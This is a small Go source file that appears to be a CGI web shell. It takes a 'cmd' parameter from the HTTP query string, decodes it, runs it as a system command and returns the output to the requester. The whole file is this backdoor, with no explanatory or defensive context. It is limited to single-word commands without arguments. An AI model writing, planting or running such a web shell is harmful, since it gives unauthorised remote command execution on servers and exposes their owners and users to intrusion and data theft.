package main

import (
	"os/exec"
	"os"
	"fmt"
	"strings"
	"net/url"
)

func main() {
	queryStrings := strings.Split(os.Getenv("QUERY_STRING"), "&")

	if len(queryStrings) > 0 {

		for _, val := range queryStrings {
			keypair := strings.Split(val, "=")
			if keypair[0] == "cmd" {
				command, err := url.QueryUnescape(keypair[1])
				if err != nil {
					os.Exit(1)
				}
				fmt.Printf("Executing: %s", keypair[1])
				cmd := exec.Command(command)
				
				output, err := cmd.Output()
				
				if err != nil {
					os.Exit(2)
				}
				
				fmt.Printf("STDOUT: %s", output)
				os.Exit(0)
			}
		}

	}
}